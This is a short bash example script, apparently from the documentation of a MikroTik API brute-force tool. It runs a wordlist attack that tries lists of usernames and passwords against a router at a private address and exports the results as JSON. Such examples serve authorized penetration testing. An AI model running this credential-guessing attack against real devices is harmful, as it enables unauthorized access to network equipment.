#!/bin/bash

# Example 2: Using wordlists
# Test multiple users and passwords

echo "=== Example 2: Wordlist Attack ==="
python ../mikrotikapi-bf.py \
  -t 192.168.88.1 \
  -u usernames.txt \
  -p passwords.txt \
  --progress \
  --export json

echo ""
echo "Results exported to results/ directory"

